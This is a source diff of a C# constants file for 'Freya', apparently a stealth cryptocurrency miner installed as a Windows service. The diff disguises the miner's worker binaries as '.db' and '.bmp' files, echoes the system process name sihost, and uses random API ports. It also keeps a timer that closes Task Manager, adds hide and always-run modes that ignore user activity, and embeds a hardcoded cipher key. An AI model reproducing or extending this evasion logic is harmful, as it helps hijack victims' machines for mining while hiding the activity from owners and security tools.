@@ -8,24 +8,26 @@ namespace Freya
 {
     public static class FConstants
     {
+        // Debug Mode
+        public const bool TextLogEnable = true;
+
         // Service Info
         public const string ServiceName = "FreyaService";
         public const string ServiceDisplayName = "Freya";
-        public const string ServiceDescription = "Freya Description";
+        public const string ServiceDescription = "Freya worker service";
 
         // Miner Info
-        public const string MinerFilePath = @"C:\Windows\System32"; //自動取出Miner執行檔放到這個路徑
-        public const string MinerFileName = "sihosts";              //Miner檔名，不用.exe
-        public const int MinerAPIPort = 3334;                       // Miner API Port
+        //public const string MinerFilePath = @"C:\Windows\System32"; //自動取出Miner執行檔放到這個路徑
+        public static string WorkFilePath = System.AppDomain.CurrentDomain.BaseDirectory;
+
+        public static readonly string[] WorkerFileName = {"sihostc.db", "sihosta.db", "sihostn.db" };
+        public static readonly string WorkerExtentionString = "bmp";
+        public static readonly int WorkerAPIPort_Start = 18000;     // Worer API port start from. 1000 random port.
 
         // Miner Strategy
         public const int TimeToCloseTaskmgr = 1200;     // taskmgr開啟超過這個時間就自動關閉
-        public const int TimeToAutoStart = 300;         // UI沒回應，Idle超過 TimeToAutoStart就自動啟動miner
-        public const int TimeIdleThreshold = 10;       // 使用者Idle超過這個時間就啟動minser (0 for always start)
+        public const int TimeToAutoStart = 90;         // Idle超過 TimeToAutoStart就自動啟動miner (Service端自動啟動)
 
-        //IPC Port
-        public const int IPCPortService1 = 58711;
-        public const int IPCPortMainUI = 58710;
 
         // Log Level
         public enum FreyaLogLevel
@@ -38,25 +40,39 @@ namespace Freya
             RAW = 50        //Debug
         }
 
+        //StringCipher Password
+        public const string StringCipherKey = "BdD75HJ6+/Jq35zMPsNphu2SKCl!CyBbY";
+
         // UI ListBox 最大顯示行數
         public const int MaxLogCount = 5000;
 
         /// <summary>
         /// Feature Byte
-        /// <para>以16進位儲存於Registry: <c>Convert.ToString((int)FConstants.FeatureByte.DMS, 16)</c> [ToDo] Encode保護</para>
+        /// <para>以16進位儲存於Registry: <c>Convert.ToString((int)FConstants.FeatureByte.Odin, 16)</c> [ToDo] Encode保護</para>
         /// <para>讀取 <c>FConstants.FeatureByte a = (FConstants.FeatureByte)Convert.ToInt32("10", 16);</c></para>
         ///</summary>
         [Flags]
         public enum FeatureByte
         {
             Base        = 0b_0000_0000_0000_0000,   // Base (Miner)
-            Dark        = 0b_0000_0000_0000_0001,   // Dark Miner, always mininging, No UI
-            FullUI      = 0b_0000_0000_0000_1000,   // 顯示所有UI
-            SMTPProxy   = 0b_0000_0000_1000_0000,   // SMTP Proxy
-            DMS         = 0b_0000_0001_0000_0000,   // DMS
-            ALL = Base | Dark | FullUI | SMTPProxy | DMS
+            Hide        = 0b_0000_0000_0000_0001,   // Hide Mode, No UI
+            AlwaysRun   = 0b_0000_0000_0000_0010,   // Always Mining, ignore idel time and taskmanager
+            Odin        = 0b_0000_0000_0000_1000,   // Show all information
+            ALL = Base | Hide | AlwaysRun | Odin
         }
 
+        public enum WorkerType
+        {
+            CPU = 0,
+            AMD = 1,
+            nVidia = 2
+        }
     }   
+
+    public class FEnv
+    {
+        public const string RADIO_OK = "ROK.";
+    }
+
 }
 
